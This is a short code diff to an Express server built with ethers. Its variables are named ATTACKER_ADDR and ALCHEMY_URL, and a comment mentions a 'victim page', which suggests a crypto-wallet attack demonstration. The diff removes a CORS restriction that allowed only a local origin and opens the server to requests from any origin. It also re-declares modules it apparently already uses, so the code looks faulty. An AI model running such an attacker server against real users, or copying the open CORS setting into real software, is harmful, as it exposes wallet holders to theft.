@@ -25,8 +25,12 @@ if (!ALCHEMY_URL || !ATTACKER_ADDR) {
 const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_URL);
 const app = express();
 
-// allow the local victim page to call the server (local dev only)
-app.use(cors({ origin: 'http://127.0.0.1:8080' }));
+const cors = require('cors');
+const bodyParser = require('body-parser');
+
+// allow requests from any origin
+app.use(cors());
+
 // keep rawBody for signature verification
 app.use(bodyParser.json({
   verify: (req, res, buf) => { req.rawBody = buf; }
